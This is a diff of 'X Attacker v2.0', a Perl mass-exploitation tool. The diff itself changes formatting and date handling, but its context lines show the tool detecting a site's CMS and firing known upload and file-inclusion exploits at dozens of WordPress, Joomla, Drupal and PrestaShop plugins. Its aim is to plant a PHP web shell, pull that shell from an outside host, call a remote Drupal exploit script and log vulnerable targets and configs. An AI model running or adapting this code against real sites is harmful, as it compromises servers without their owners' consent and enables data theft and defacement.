@@ -3,7 +3,7 @@
 #Coded By Mohamed Riahi 10/10/2017
 #don't Change my Fucking Rights
 
-#past here
+if ($^O =~ /MSWin32/) { use Win32::Console::ANSI; }
 use Getopt::Long;
 use HTTP::Request;
 use LWP::UserAgent;
@@ -15,6 +15,7 @@ use HTTP::Request::Common qw(POST);
 use HTTP::Request::Common qw(GET);
 use URI::URL;
 use IO::Socket::INET;
+use Time::localtime;
 my $ua = LWP::UserAgent->new;
 $ua->timeout(10);
 
@@ -33,32 +34,18 @@ OPTIONS:
 );
 exit;}
 
-my $year = "2017";
-my $month = "11";
-my $datetime    = localtime;
+my $datetime = localtime;
+my ($month, $year) = ($datetime->month, $datetime->year);
 
 system("title X Attacker v2.0");
-if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
+if ($^O =~ /MSWin32/) { system("cls"); } else { system("clear"); }
 print color('bold green');
 
 $tmp="tmp";
-    if (-e $tmp) 
-    {
-    }
-    else
-    {
-        mkdir $tmp or die "Error creating directory: $tmp";
-    }
+if (-e $tmp) {} else {mkdir $tmp or die "Error creating directory: $tmp"; }
 
 $rez="Result";
-    if (-e $rez) 
-    {
-    }
-    else
-    {
-        mkdir $rez or die "Error creating directory: $rez";
-    }
-
+if (-e $rez) {} else { mkdir $rez or die "Error creating directory: $rez"; }
 
 
 print q(
@@ -74,16 +61,16 @@ print q(
           OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
           "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
              Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
-             :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?          
+             :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?
                           oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                           '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
-                               `$"  `OOOO' `O"Y ' `OOOO'  o              
-                                      OP"          : o                                 
+                               `$"  `OOOO' `O"Y ' `OOOO'  o
+                                      OP"          : o
 );
 
 print color('reset');
 print "                       ";
-print colored ("[ X Attacker v2.0 ]",'white on_red');  
+print colored ("[ X Attacker v2.0 ]",'white on_red');
 print colored ("[ Coded By Mohamed Riahi ]\n",'white on_red');
 print "                           ";
 print colored ("[ Start At $datetime ]",'white on_red'),"\n\n";
@@ -105,8 +92,8 @@ $a++;
 cms();
 }
 
-################ CMS DETCTER #####################
-sub cms(){
+################ CMS DETECTOR #####################
+sub cms() {
 $ua = LWP::UserAgent->new(keep_alive => 1);
 $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
 $ua->timeout (15);
@@ -121,7 +108,7 @@ print color('bold white'),"\n[$a] $site - ";
     print color("bold green"), "Joomla\n\n";
     print color('reset');
     open(save, '>>tmp/joomla.txt');
-    print save "$site\n";   
+    print save "$site\n";
     close(save);
   comjce();
   comedia();
@@ -136,10 +123,10 @@ print color('bold white'),"\n[$a] $site - ";
 }
 elsif($cms =~/wp-content|wordpress|xmlrpc.php/) {
     print color('bold white'),"\n[$a] $site - ";
-    print color("bold green"), "WordPress\n\n"; 
-    print color('reset'); 
+    print color("bold green"), "WordPress\n\n";
+    print color('reset');
     open(save, '>>tmp/Wordpress.txt');
-    print save "$site\n"; 
+    print save "$site\n";
     close(save);
     addblockblocker();
     blaze();
@@ -172,7 +159,7 @@ elsif($cms =~/Drupal|drupal|sites\/all|drupal.org/) {
     print color("bold green"), "DruPal\n\n";
     print color('reset');
     open(save, '>>tmp/drupal.txt');
-    print save "$site\n";   
+    print save "$site\n";
     close(save);
 drupal();
 }
@@ -181,7 +168,7 @@ elsif($cms =~/Prestashop|prestashop/) {
     print color("bold green"), "Prestashop\n\n";
     print color('reset');
     open(save, '>>tmp/Prestashop.txt');
-    print save "$site\n";   
+    print save "$site\n";
     close(save);
 
 
@@ -220,7 +207,7 @@ print color('bold white'),"\n[$a] $site - ";
     print color("bold green"), "Lokomedia\n\n";
     print color('reset');
     open(save, '>>tmp/lokomedia.txt');
-    print save "$site\n";   
+    print save "$site\n";
     close(save);
     lokomedia();
 }
@@ -229,17 +216,17 @@ print color('bold white'),"\n[$a] $site - ";
     print color("bold green"), "Lokomedia\n\n";
     print color('reset');
     open(save, '>>tmp/lokomedia.txt');
-    print save "$site\n";   
+    print save "$site\n";
     close(save);
     lokomedia();
 }
 
 else{
 print color('bold white'),"\n[$a] $site - ";
-    print color("bold green"), "Unknown\n\n"; 
+    print color("bold green"), "Unknown\n\n";
     open(save, '>>tmp/Unknown.txt');
-    print color('reset'); 
-    print save "$site\n";   
+    print color('reset');
+    print save "$site\n";
     close(save);
 }
 }
@@ -459,7 +446,7 @@ print color('bold white'),"\n";
 }
 
 ################ Power Zoomer #####################
-sub powerzoomer(){ 
+sub powerzoomer(){
 my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";
 
 my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["XAttacker.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);
@@ -888,8 +875,8 @@ print color('bold red'),"] ";
 print color('bold white'),"Revslider Get Config";
 print color('bold white')," .............. ";
 print color('bold green'),"VULN\n";
-     open(save, '>>Result/Config.txt');   
-    print save "[RevsliderConfig] $url\n";   
+     open(save, '>>Result/Config.txt');
+    print save "[RevsliderConfig] $url\n";
     close(save);
     getcpconfig();
 }else{
@@ -1008,7 +995,7 @@ print color('bold red'),"NOt VULN\n";
 }
 
 ################ Simple Ads Manager #####################
-sub ads(){  
+sub ads(){
 my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";
 
 my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["XAttacker.php"], action => 'upload_ad_image', path => '',]);
@@ -1039,7 +1026,7 @@ print color('bold red'),"NOt VULN\n";
 }
 
 ################ Slide Show Pro #####################
-sub slideshowpro(){ 
+sub slideshowpro(){
 my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";
 
 my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["XAttacker.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);
@@ -1076,14 +1063,14 @@ print color('bold red'),"NOt VULN\n";
 ##############################################################################################
 # check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
 ##############################################################################################
-sub wpmobiledetector(){ 
+sub wpmobiledetector(){
 $wpmdshell = "http://testatranslations.com/shell/XAttacker.php";
 $url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
 $wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/XAttacker.php?X=Attacker";
 
-my $check = $ua->get("$url"); 
+my $check = $ua->get("$url");
 
-my $checkup = $ua->get("$wpmdup")->content; 
+my $checkup = $ua->get("$wpmdup")->content;
 if($checkup =~/X Attacker/) {
 print color('bold red'),"[";
 print color('bold green'),"+";
@@ -1147,7 +1134,7 @@ print color('bold red'),"NOt VULN\n";
 }
 
 ################ InBoundio Marketing #####################
-sub inboundiomarketing(){ 
+sub inboundiomarketing(){
 my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
 $inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/XAttacker.php?X=Attacker";
 my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.php"],]);
@@ -1181,7 +1168,7 @@ print color('bold red'),"NOt VULN\n";
 
 
 ################ dzs-zoomsounds #####################
-sub dzszoomsounds(){ 
+sub dzszoomsounds(){
 my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
 $dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/XAttacker.php?X=Attacker";
 my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["XAttacker.php"],]);
@@ -1214,7 +1201,7 @@ print color('bold red'),"NOt VULN\n";
 }
 
 ################ reflex-gallery #####################/
-sub reflexgallery(){ 
+sub reflexgallery(){
 my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
 $reflexup = "$site/wp-content/uploads/$year/$month/XAttacker.php?X=Attacker";
 my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["XAttacker.php"],]);
@@ -1247,7 +1234,7 @@ print color('bold red'),"NOt VULN\n";
 
 
 ################ Creative Contact Form #####################
-sub sexycontactform(){ 
+sub sexycontactform(){
 my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
 $sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/XAttacker.php?X=Attacker";
 my $field_name = "files[]";
@@ -1255,7 +1242,7 @@ my $field_name = "files[]";
 my $sexycontactres = $ua->post( $url,
             Content_Type => 'form-data',
             Content => [ $field_name => ["XAttacker.php"] ]
-           
+
             );
 
 $checksexycontactup = $ua->get("$sexycontactup")->content;
@@ -1328,7 +1315,7 @@ my $field_name = "file[]";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => [ $field_name => ["$image"] ]
-           
+
             );
 
 $jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/XAttacker.gif";
@@ -2041,7 +2028,7 @@ $cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/XAttacker.
 
 my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
 if($checkcartabandonmentproOld =~/X Attacker/) {
-  
+
 print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
@@ -2143,7 +2130,7 @@ my $field_name = "images[]";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/XAttacker.php?X=Attacker";
 
@@ -2219,7 +2206,7 @@ my $field_name = "images[]";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $pk_flexmenuup="$site/modules/pk_flexmenu/uploads/XAttacker.php?X=Attacker";
 
@@ -2259,7 +2246,7 @@ my $field_name = "images[]";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/XAttacker.php?X=Attacker";
 
@@ -2300,7 +2287,7 @@ my $field_name = "images[]";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php?X=Attacker";
 
@@ -2340,7 +2327,7 @@ my $field_name = "Filedata";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $megamenuup="$site/XAttacker.php.png?X=Attacker";
 
@@ -2381,7 +2368,7 @@ my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             data => 'bajatax',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/XAttacker.php?X=Attacker";
 
@@ -2423,7 +2410,7 @@ my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             data => 'bajatax',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/XAttacker.php?X=Attacker";
 
@@ -2464,7 +2451,7 @@ my $field_name = "file";
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
             Content => [ $field_name => ["$shell"] ]
-           
+
             );
 $masseditproductup="$site/masseditproduct/uploads/file/XAttacker.php?X=Attacker";
 
@@ -2744,9 +2731,9 @@ print color('bold red'),"NOt FOUND\n";
 }
 
 ################################################################
-#                                                              #     
-#                            JOOMLA                            # 
-#                                                              #                                                                
+#                                                              #
+#                            JOOMLA                            #
+#                                                              #
 ################################################################
 
 sub comjce(){
@@ -2810,7 +2797,7 @@ my $field_name = "Filedata[]";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => [ $field_name => ["$index"] ]
-           
+
             );
 
 $mediaup="$site/images/XAttacker.txt";
@@ -2937,7 +2924,7 @@ my $field_name = "Filedata";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => ["userfile" => ["$shell"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
-           
+
             );
 
 $comfabrikupp="$site/media/XAttacker.php?X=Attacker";
@@ -2979,7 +2966,7 @@ my $field_name = "Filedata[]";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => ["userfile" => ["$index"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
-           
+
             );
 
 $comfabrikup="$site/media/XAttacker.txt";
@@ -3062,7 +3049,7 @@ my $url = "$site/index.php?option=com_adsmanager&task=upload&tmpl=component";
 
 my $response = $ua->post( $url,
             Cookie => "", Content_Type => "form-data", Content => [file => ["XAttacker.jpg"], name => "XAttacker.html"]
-           
+
             );
 
 $comadsmanagerup="$site/tmp/plupload/XAttacker.html";
@@ -3108,8 +3095,8 @@ print color('bold green')," [";
 print color('bold red'),"+";
 print color('bold green'),"] ";
 print color('bold white'),"Exploit It It Manual\n";
-    open(save, '>>Result/vulntargets.txt');   
-    print save "[blog] $site\n";   
+    open(save, '>>Result/vulntargets.txt');
+    print save "[blog] $site\n";
     close(save);
 }else{
 print color('bold red'),"[";
@@ -3137,8 +3124,8 @@ print color('bold green')," [";
 print color('bold red'),"+";
 print color('bold green'),"] ";
 print color('bold white'),"Exploit It It Manual\n";
-    open(save, '>>Result/vulntargets.txt');   
-    print save "[Com Users] $site\n";   
+    open(save, '>>Result/vulntargets.txt');
+    print save "[Com Users] $site\n";
     close(save);
 }else{
 print color('bold red'),"[";
@@ -3175,7 +3162,7 @@ my $field_name = "Filedata[]";
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
             Content => [ $field_name => ["$index"] ]
-           
+
             );
 
 $weblinksup= "$site/images/XAttacker.gif";
@@ -3251,7 +3238,7 @@ $ua = LWP::UserAgent->new(keep_alive => 1);
 $ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
 $ua->timeout (20);
 
-# check the link of the exploit or you can download script from here : http://pastebin.com/wPAbtyJ4 and you upload it on you one shell :) 
+# check the link of the exploit or you can download script from here : http://pastebin.com/wPAbtyJ4 and you upload it on you one shell :)
 $drupalink = "http://oriflame-angela.ru/gassrini.php";
 my $exploit = "$drupalink?url=$site&submit=submit";
 $admin ="XAttacker";
